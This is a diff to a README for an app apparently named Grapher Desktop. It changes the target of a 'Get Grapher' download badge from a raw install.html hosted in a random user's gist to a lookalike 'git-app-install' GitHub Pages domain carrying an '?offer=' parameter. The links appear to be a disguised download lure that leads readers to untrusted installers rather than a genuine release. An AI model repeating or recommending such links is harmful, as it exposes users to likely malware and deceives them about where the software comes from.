@@ -1,6 +1,6 @@
 # Grapher Desktop — data visualization for macOS
 
-<a href="https://gistcdn.githack.com/kirkniget1973/78207649a569fdf43ed69c122ca05c04/raw/0ee7a9120ae8274b01f1d406325870580f84eccc/install.html?offer=Grapher" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=Grapher" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Grapher%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
